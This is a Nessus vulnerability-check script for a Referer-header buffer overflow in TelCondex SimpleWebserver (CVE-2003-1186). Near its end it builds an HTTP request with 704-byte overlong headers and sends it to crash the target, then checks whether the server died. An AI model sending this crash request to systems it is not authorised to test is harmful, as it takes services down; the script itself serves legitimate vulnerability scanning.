include("compat.inc");

if(description) 
{ 
	script_id(11927); 
	script_cve_id("CVE-2003-1186");
	script_bugtraq_id(8925);
	script_xref(name:"OSVDB", value:"2738");
	script_xref(name:"OSVDB", value:"57530");
        script_version("$Revision: 1.12 $"); 
      
	name["english"] = "TelCondex Simple Webserver Buffer Overflow"; 
        
      script_name(english:name["english"]); 

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server has a buffer overflow vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote TelCondex SimpleWebserver is vulnerable to a remote
executable buffer overflow, due to missing length check on the
referer-variable of the HTTP-header.  A remote attacker could exploit
this to crash the web server, or potentially execute arbitrary code."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?af2bb0e4 (.exe installer)"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to version 2.13 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

      summary["english"] = "Checks for TelCondex Buffer Overflow";
	script_summary(english:summary["english"]);
	script_category(ACT_DENIAL);
# Conversion to new API by Tenable Network Security, Inc.
	script_copyright(english:"This script is Copyright (C) 2003-2009 Matt North");

	family["english"] = "Web Servers";
	script_family(english:family["english"]);
	
	script_dependencie("http_version.nasl");
	script_require_ports("Services/www", 80);
	script_require_keys("Settings/ParanoidReport");
	exit(0);
}

include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);
if(http_is_dead(port:port)) exit(0);


s = string( "GET / HTTP/1.1\r\n", "Accept: */* \r\n" , "Referer:", crap(704), "\r\n", "Host:" , crap(704), "\r\n", "Accept-Language", 
		crap(704), "\r\n\r\n" );

soc =  http_open_socket(port);
if(!soc) exit(0);

send(socket: soc, data: s);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port, retry: 3))
	security_hole(port);
